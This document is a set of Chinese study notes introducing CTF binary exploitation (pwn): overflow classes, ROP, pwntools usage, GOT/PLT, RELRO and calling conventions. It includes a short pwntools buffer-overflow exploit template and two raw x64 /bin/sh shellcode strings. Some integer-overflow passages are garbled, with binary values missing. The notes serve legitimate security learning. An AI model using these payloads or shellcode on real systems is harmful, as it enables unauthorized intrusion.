# pwn入门

参考链接：

[【二进制安全】PWN基础入门大全（非常详细）零基础入门到精通，收藏这一篇就够了-CSDN博客](https://blog.csdn.net/leah126/article/details/140679045)

[Pwn | 快速入门 - NewStar CTF](https://ns.openctf.net/learn/pwn.html)

[超全PWN入门笔记，从栈到堆一步到位 - X0H3M1 - 博客园](https://www.cnblogs.com/X0H3M1/articles/16669128.html)

[你想有多PWN(不再更新)_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1mr4y1Y7fW/?spm_id_from=333.337.search-card.all.click&vd_source=f264368eefdba6c9e52d63931d176453)

[[Pwn之路\] 欢迎来到堆攻击的世界——简单堆溢出原理和例题 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/endpoint/371095.html)

[第二章_第13节_ret2syscall_x1.5_整合_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1mr4y1Y7fW?spm_id_from=333.788.videopod.episodes&vd_source=f264368eefdba6c9e52d63931d176453&p=23)















## 定义

PWN通常指的是通过不同的攻击手段如利用漏洞、进行社会工程学攻击等方法成功地获得了一个设备、系统或网络的未授权控制权。



## 常见漏洞

### 栈溢出

栈溢出是一种常见的安全漏洞，它利用了程序在执行过程中使用的栈内存空间有限的特性。

栈是一种数据结构，用来存储函数的局部变量、函数的参数以及函数调用的返回地址等信息。

栈的特点是先进后出，即最后进入栈的数据最先被访问到。

当攻击者向程序输入过多的数据时，这些数据会超出栈内存所能容纳的范围，从而覆盖了栈中的其他数据，甚至覆盖了函数返回地址。

一旦返回地址被篡改，程序就会跳转到攻击者指定的代码执行，从而实现任意代码执行的攻击。




### 堆溢出

堆溢出是另一种内存溢出漏洞，但与栈溢出不同，它发生在程序的堆内存区域。

堆是用来动态分配内存的区域，程序员可以请求分配任意大小的内存块，并在程序运行期间随时释放它们。

堆溢出通常是由于程序在写入数据时超出了申请的内存块大小，导致数据覆盖了相邻的内存块。



### 整数溢出

整数溢出发生在将一个较大的整数赋值给一个较小范围的整数变量时，导致数据超出该变量的存储范围并发生溢出。

这种溢出可能导致数据被截断、覆盖或产生不正确的计算结果。

攻击者可以利用整数溢出漏洞来绕过安全限制、绕过认证机制或执行其他恶意操作。

也可能是atoi之类的



### 格式化字符串漏洞

格式化字符串漏洞通常发生在C语言等编程语言中，当程序不正确地处理格式化字符串函数（如printf、sprintf等）的输入时。

攻击者可以通过构造特制的格式化字符串来读取或写入任意内存地址的数据，甚至执行任意代码。



### ROP

ROP是一种利用程序中的现有代码片段（称为“gadgets”）来执行攻击者意图的技术。

在启用了某些安全保护（如NX位、ASLR等）的环境中，传统的栈溢出攻击可能难以直接执行shellcode。

ROP通过覆盖返回地址为程序中的某个gadget的地址，并利用一系列这样的gadgets来构建攻击载荷，最终实现攻击者的目标。




## 做题思路



找危险函数，或者上传危险函数覆盖



















## pwntools的使用

**Pwntools** 是一个用于漏洞利用和二进制分析的 `Python 库`

`pwntools`可以说是pwn手必备的工具，它帮助pwn手`连接远程服务器`，`发送信息`，`接收信息`，以及提供了很多工具来帮助pwn手快速攻克题目



安装：

```
>>> apt-get update
>>> apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
>>> python3 -m pip install --upgrade pip
>>> python3 -m pip install --upgrade pwntools
```



直接cmd里面执行

```
pip install pwntools
```





### 导入pwntools

```py
from pwn import *
```



### 需要分清楚靶机的具体信息，不然无法连接

比如：

```python
context(os='linux', arch='AMD64', log_level='debug')
```



### 连接靶机具体ip和端口号：   nc连接

```python
用于连接远程服务器，并把连接到的进程命名为p，后续的函数都围绕这个p进程展开
p = remote("ip",port) 
比如:p = remote("node5.buuoj.cn",5555)
```



如果用ssh连接，则：

```python
通过使用ssh来连接靶机
p = ssh(host='192.168.xx.xxx', user='xidp', port=6666, password='88888888')
```



### 发送信息：

```python
**************************************************
p.send(payload) # 直接发送payload
**************************************************
p.sendline(payload) # 发送payload，但是结尾会有一个\n
**************************************************
p.sendafter("string", payload) # 接收到 string (这里说的string可以替换成任何信息) 之后会发送payload，但是如果没有接收到string，那么就会导致脚本一直卡在这里不动
**************************************************
p.sendlineafer("string", payload) # 接收到 string 之后会发送payload 并且在payload最后添加\n
```

tips:

如果函数是`gets()`和`scanf()`这类函数它们会以`\n`作为结束符号，这时候就需要我们手动发送`\n` 不然函数无法结束，这时候就需要使用`p.sendline(payload) ` 



如果函数是`read()` 这类的函数，使用`p.sendline`和`p.send`都可以,但是需要区分不同情况





### 接受信息：

```python
p.recv(int) 利用recv来接收返回的数据，并且可以控制接受到的字节数
比如:p.recv(7) => 系统输出'hello world' => 我们会接受到'hello w' 

p.recvline('string') 设置一个标识符，接收标识符所在的那一行
比如:p.recvline('O.o')
#系统输出:
Hello World 
This is a test. 
O.o This is the target line. 
Goodbye.
#我们接收:
O.o This is the target line. 
**************************************************
p.recvlines(N) 接收 N 行输出
**************************************************
p.recvuntil('string') 可以指定接收到某一字符串的时候停止 ,还有第二个参数 drop，drop=True(默认为false) 表示丢弃设定的停止符号
比如:p.recvuntil('or') 
#系统输出:
hello world 
#我们接收:
hello wor  
比如:a = io.recvuntil(']', drop=True)
就是一直获取到`]`符号出现就停止，并且不接收`]`符号
**************************************************
```



只有信息多才需要使用这个



### 构造发送地址类型

#### `p64/p32/u64/u32`这类函数的作用:

```python
**************************************************
p64(int) 
p64(0xfaceb00c) => '\x0c\xb0\xce\xfa\x00\x00\x00\x00\x00'
**************************************************
u64(str) 
u64('\x0c\xb0\xce\xfa\x00\x00\x00\x00') =>0xfaceb00c
**************************************************
p32(int)  
p32(0xfaceb00c) => '\x0c\xb0\xce\xfa'
**************************************************
u32(str) 
u32('\x0c\xb0\xce\xfa') => 0xfaceb00c
**************************************************

```







### 传递到终端

```python
p.interactive()
接受信息并且在终端操作，程序拿到shell
```





### 一个最基本的payload如下：

```python
from pwn  import *
import pwnlib
from LibcSearcher import *
context(os='linux',arch='amd64',log_level='debug')

if __name__ == '__main__':
	
	HOST = 'node4.buuoj.cn'
	PORT = 29105
	conn = remote(HOST ,PORT)
	payload = "A"*0x17 + p64(0x40118A)
	conn.sendline(payload)
	conn.interactive()
```



### 汇编与反汇编



```python
>>> asm('mov eax, 0')   #汇编
'\xb8\x00\x00\x00\x00'

>>> disasm('\xb8\x0b\x00\x00\x00')  #反汇编
'mov    eax,0xb'
```



### shellcode

```python
context(os='linux', arch='i386')
# 表示将当前执行上下文的体系结构设置为i386(这里的i386可以通过checksec来查看文件是什么架构的  
shellcode = asm(shellcraft.sh())
# asm()是把括号内的内容编译成机器码(只有机器码才可以执行)，一般用来打入后门。pwntools自带的后门函数，可以生成类似system('/bin/sh/')这样功能的汇编代码 
# 通常可以配合  .ljust() 来使用  
shellcode.ljust(112, b'A')  
# 这里的 .ljust() 是 Python 中字符串对象的方法，用于在字符串的右侧填充指定的字符，使字符串达到指定的长度。

```



```python
from pwn import *
context(arch='i386', os='linux')
shellcode = asm(shellcraft.sh())
shellcode.ljust(112, b'A')  
```



如果不用库自带的shellcode，可以有一些编译好的shellcode



64位Linux的24Byte的ShellCode：

```
shellcode_x64 ="\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"
```



64位Linux的23Byte的shellcode：

```
shellcode_x64 ="\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
```







### 报错问题：

#### 1.使用p64()时报错：TypeError: can only concatenate str (not “bytes“) to str

```python
p64(0x00400596).decode('unicode_escape')
```







## 堆

栈、堆、内核

堆溢出（Heap Overflow）是指在程序执行过程中，向堆（Heap）区域写入超出其分配内存边界的数据，从而覆盖了相邻的内存空间。这可能导致程序崩溃、执行意外行为或者被攻击者利用。



而UAF是指释放后引用（Use-After-Free）漏洞，它是一种常见的内存安全问题。当程序释放了一个堆上的内存块，但后续仍然继续使用该已释放的内存块，就会产生UAF漏洞。攻击者可以利用UAF漏洞来执行恶意代码，读取敏感数据，控制程序的执行流程等。



# 重点基础知识

1. 函数地址的基本概念
   - **静态函数地址（编译时确定）**：在编译程序时，每个函数在二进制文件内部有一个相对的偏移地址。这个地址是基于二进制文件的布局确定的，例如在 ELF 文件的代码段（`.text`段）中，函数按照编译顺序排列，它们之间有相对固定的偏移。像`elf.sym['function_name']`获取的就是这种在编译阶段确定的函数在 ELF 文件中的相对地址。
2. PLT（过程链接表）和 GOT（全局偏移表）的作用与关系
   - PLT 的作用
     - **延迟绑定**：PLT 主要用于实现延迟绑定机制。当程序调用一个外部函数（如`libc`中的函数）时，它首先会进入 PLT。以`puts`函数为例，程序代码中调用`puts`时，实际上是跳转到`puts@plt`（`puts`在 PLT 中的入口）。在程序刚开始运行时，PLT 中的条目只包含跳转到动态链接器（`ld - linux.so`）的代码，而不是真正的函数地址。
     - **代码位置固定**：PLT 在 ELF 文件中有固定的位置，它是程序代码段的一部分。`elf.sym['puts']`获取的函数地址可能就是`puts`在 PLT 中的地址（对于外部函数）。
   - GOT 的作用
     - **存储真实地址**：GOT 用于存储外部函数在内存中的实际运行时地址。当动态链接器解析了外部函数的地址后，会将这个地址填充到 GOT 对应的条目中。例如，`elf.got['puts']`获取的是`puts`函数在 GOT 中的地址，这个地址所存储的值就是`puts`函数在内存中的实际运行时地址。
     - **动态更新**：在程序运行初期，GOT 中的外部函数地址可能是未填充的（初始化为一些特殊值），当第一次调用外部函数时，动态链接器会被触发去解析函数地址并填充到 GOT 中。
   - 两者的关系
     - **PLT 间接调用 GOT**：当程序通过 PLT 调用外部函数时，PLT 中的代码会间接跳转到 GOT 中存储的函数实际地址。具体来说，PLT 中的代码会先检查 GOT 中对应函数地址是否已经解析，如果没有解析，就会调用动态链接器来解析地址并填充到 GOT，然后跳转到 GOT 中的地址执行函数。



FORTIFY_SOURCE

1. 概述
   - 在 Pwn（二进制漏洞利用）场景中，`FORTIFY_SOURCE`是一个 GCC（GNU Compiler Collection）编译器的安全相关选项。当`FORTIFY_SOURCE = 0`时，表示关闭了 GCC 的某些安全加固机制。
2. FORTIFY_SOURCE 机制简介
   - 当`FORTIFY_SOURCE`开启（通常设为大于 0 的值，如`FORTIFY_SOURCE = 2`是比较常见的高安全级别设置），编译器会对一些可能存在缓冲区溢出风险的函数进行检查和加固。这些函数包括但不限于`strcpy`、`strcat`、`sprintf`等。
   - 例如，对于`strcpy`函数，编译器会在编译时添加额外的代码来检查目标缓冲区的大小，以防止缓冲区溢出。它会将目标缓冲区的大小作为一个参数传递给一个内部的检查函数，在运行时如果发现复制的数据长度可能超过缓冲区大小，就会提前终止程序并报错，从而增强程序的安全性。
3. 关闭后的影响（FORTIFY_SOURCE = 0）
   - 漏洞利用方面
     - 对于攻击者来说，关闭`FORTIFY_SOURCE`可能会使某些原本难以利用的漏洞变得容易利用。例如，如果一个程序存在缓冲区溢出漏洞，并且该程序是在`FORTIFY_SOURCE = 0`的情况下编译的，攻击者就可以更容易地构造恶意输入来覆盖栈上或堆上的数据结构，因为没有了编译器添加的缓冲区大小检查机制来阻止溢出。
   - 程序性能方面
     - 关闭这个选项可能会在一定程度上提高程序的性能。因为开启`FORTIFY_SOURCE`时，编译器会插入额外的检查代码，这些代码在运行时会消耗一定的时间和资源。当`FORTIFY_SOURCE = 0`时，就避免了这些额外的开销，不过这种性能提升通常是比较微小的，除非程序中大量使用了相关的可能存在风险的函数。



整型溢出：

- 以 32 位有符号整数为例
  - 假设在 C 或 C++ 语言中，有一个 32 位有符号整数变量`int num = 2147483647`（这是 32 位有符号整数的最大值），如果执行`num = num + 1`操作，就会发生溢出。在有符号整数的二进制补码表示中，`2147483647`的二进制表示为`01111111111111111111111111111111`，加`1`后变为`10000000000000000000000000000000`，这个值在有符号整数表示中是`-2147483648`，而在无符号整数表示中就是`0x80000000`（如果将其看作无符号数）。
  - 这里，从 2147483646（二进制表示为`01111111111111111111111111111110`）开始，加 1 后得到 2147483647（二进制表示为`01111111111111111111111111111111`），转换为无符号整数后就是 0x7FFFFFFF。



1. 有符号整数的表示与范围
   - 在计算机中，对于有符号整数（以 32 位为例），通常采用二进制补码表示。32 位有符号整数的范围是 到 ，即 - 2147483648 到 2147483647。其最高位（最左边的位）是符号位，0 表示正数，1 表示负数。
   - 例如，对于正数，如最大的正数 2147483647，它的二进制表示为 。而对于负数 - 1，它的二进制补码表示为 。
2. 整数溢出的概念
   - 当进行算术运算时，如果结果超出了这个有符号整数的范围，就会发生整数溢出。溢出后的结果会根据二进制补码的规则重新解释。
   - 例如，当最大值 2147483647（二进制为 ）加 1 时，结果的二进制表示为 ，这个值在有符号整数表示中是 - 2147483648。
3. 转换为无符号整数的过程
   - 当把一个有符号整数转换为无符号整数时，计算机不再考虑符号位。以 32 位为例，无符号整数的范围是 到 ，即 0 到 4294967295。
   - 假设我们有一个有符号整数，它的值是接近最大值的一个数，比如 2147483646（二进制为 ），当这个数加 1 后，得到 2147483647（二进制为 ）。
   - 当把这个有符号整数 2147483647 转换为无符号整数时，由于无符号整数不考虑符号位，它的值就是二进制表示对应的无符号整数的值，即 对应的十进制无符号整数为 2147483647，十六进制表示为 0x7FFFFFFF。
   - 简单来说，从数学角度看，就是先根据有符号整数的二进制补码运算规则进行算术运算（可能导致溢出），然后在转换为无符号整数时，把原来的二进制表示按照无符号整数的范围和规则重新解释，计算出对应的无符号整数的值。



1. 如何 “溢出” 到 - 1（从概念角度）
   - 在正常的无符号整数运算中，不会直接溢出到 - 1，因为无符号整数不包含负数。但是如果从二进制位的角度以及和有符号整数的对比来理解，可以这样看：
   - 当一个 32 位无符号整数进行加法运算并不断增加时，例如从 0 开始不断加 1，当加到最大值 4294967295（二进制表示为`11111111111111111111111111111111`）后，如果再增加 1，由于无符号整数的溢出特性，结果会变为 0（二进制表示重新从`00000000000000000000000000000000`开始），这就好像是一个 “循环”。
   - 现在，如果我们把这个二进制位模式`11111111111111111111111111111111`看作是有符号整数的二进制补码表示，那么它代表的就是 - 1。在有符号整数的二进制补码表示中，最高位为 1 表示负数，这个二进制数通过补码转换规则可以得到 - 1 这个值。



当RELRO为Partial RELRO时，表示.got不可写而.got.plt可写。
当RELRO为FullRELRO时，表示.got不可写.got.plt也不可写。
当RELRO为No RELRO时，表示.got与.got.plt都可写。



==计算机中有 4 种溢出情况，以 32 位整数为例。==

① 无符号上溢：无符号数 0xffffffff 加 1 会变成 0。

② 无符号下溢：无符号数 0 减去 1 会变成 0xffffffff,即-1。

③ 有符号上溢：有符号正数 0x7fffffff 加 1 变成 0x80000000, 即从 2147483647 变成了-2147483648。

④ 有符号下溢：有符号负数 0x80000000 减去 1 变成 0x7fffffff,即从-2147483648 变成了 2147483647。

一个经典的整数溢出例子就是 c 语言的 abs 函数，int abs(int x)，该函数返回 x 的绝对值。但当 abs()函数的参数是 0x80000000 即-2147483648 的时候，它本来应该返回2147483648，但正整数的范围是 0-2147483647，所以他返回的仍然是个负数，即本身-2147483648。





gdb调试

```
gdb
b main
b printf

r

c

ni

q

stack 24

info address printf
```





push ebp就等于将ebp的值保存到栈中，并且将当前esp下移

pop ebp就等于将ebp的值从栈中取出来，将ebp指向这个值



图来自长亭

![image-20241101170016036](../_media/image-20241101170016036.png)



[PWN 64位程序寄存器的使用-腾讯云开发者社区-腾讯云](https://cloud.tencent.com/developer/article/2277507)

六十四位汇编

参数少于7，参数从左到右放入寄存器，rdi，rsi，rdx，rcx，r8，r9

参数大于7，前六个一样，但是后面是从右向左放入栈中，和32汇编一样

实例：

 H(a, b, c, d, e, f, g, h);

 a->%rdi, b->%rsi, c->%rdx, d->%rcx, e->%r8, f->%r9 

h->8(%esp) g->(%esp) 

call H

也就是说传入参数要去寻找对应的寄存器，多少个参数就找多少个寄存器









ret2text

ret2shellcode

ret2syscall

那么ret2text——程序中有system("/bin/sh")代码段，控制流执行
那么ret2shellcode——程序中不存在system("/bin/sh/")的代码段，自己恶意填入代码并在可执行段执行 
那么ret2syscall——程序中不存在system("/bin/sh/")的代码段，不存在合适的可执行段进行恶意代码的执行，但是程序是静态链接，且程序中中存在代码片段，拼接可组成系统调用 







函数跳转时候的栈变化

函数调用可以分解为如下步骤：

- 父函数将调用参数从后向前压栈
- 将返回地址压栈保存
- 跳转到子函数起始地址执行
- 子函数将父函数栈帧起始地址 rpb 压栈
- 将 rbp 的值设置为当前 rsp 的值，即将 rbp 指向子函数栈帧的起始地址

上述过程中，保存返回地址和跳转到子函数处执行由 call 一条指令完成，在 call 指令执行完成时，已经进入了子程序中，因而将上一栈帧 rbp 压栈的操作，需要由子程序来完成



返回：

函数返回时，返回值保存在 rax 寄存器中。之后需要将栈的结构恢复到函数调用之前的状态，并跳转到父函数的返回地址处继续执行
由于函数调用时已经保存了返回地址和父函数栈帧的起始地址，要恢复到子函数调用之前的父栈帧，我们只需要执行以下两条指令：







ELF 文件每个部分都是分段的。

IDA中，按下 ⇧ ShiftF7 即可查看 

或者 Ctrl+S就可以查看了

几个比较重要的段（Section）的作用：

- `.text` 段：存储程序的代码，具有可读可执行权限，不可写
- `.bss` 段：存储没有赋初值的全局变量，可读可写
- `.data` 段：存储已经赋初值的全局变量，可读可写
- `.rodata` 段：存储全局常量，比如常量字符串等，仅仅可读



##### 3、调用函数

调用一个函数时，先将堆栈原先的基址（EBP）入栈，以保存之前任务的信息。然后将栈顶指针的值赋给EBP，将之前的栈顶作为新的基址（栈底），然后再这个基址上开辟相应的空间用作被调用函数的堆栈。函数返回后，从EBP中可取出之前的ESP值，使栈顶恢复函数调用前的位置；再从恢复后的栈顶可弹出之前的EBP值，因为这个值在函数调用前一步被压入堆栈。这样，EBP和ESP就都恢复了调用前的位置，堆栈恢复函数调用前的状态。



